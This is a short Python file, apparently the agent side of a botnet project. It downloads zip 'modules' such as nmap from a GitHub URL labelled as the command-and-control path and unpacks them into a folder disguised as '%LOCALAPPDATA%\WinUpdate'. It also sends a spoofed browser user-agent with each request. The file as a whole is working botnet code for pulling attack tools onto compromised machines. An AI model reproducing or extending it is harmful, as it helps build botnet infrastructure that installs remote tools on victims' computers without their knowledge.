import os
import zipfile

import requests

DISK_PATH = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
C2_MODULES_PATH = r'https://github.com/notclement/botnet-enumeration-network/raw/master/server_django/apps/api/modules/{}'
HEADERS = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}


def download_module(module_name):
    path_to_zip_file = "{}\\{}.zip".format(DISK_PATH, module_name)
    with open(path_to_zip_file, 'wb') as file:
        response = requests.get(C2_MODULES_PATH.format(module_name), HEADERS)
        file.write(response.content)
    with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:
        zip_ref.extractall(DISK_PATH + '\\' + module_name)
    os.remove(path_to_zip_file)


def get_loaded_modules():
    root = DISK_PATH
    return [item for item in os.listdir(root) if
            os.path.isdir(os.path.join(root, item))]


def main():
    folder_name = 'nmap'
    # if folder_name in get_loaded_modules():
    #     print('{} is on disk'.format(folder_name))
    # else:
    #     print('{} is not on disk'.format(folder_name))
    download_module(folder_name)


if __name__ == '__main__':
    main()
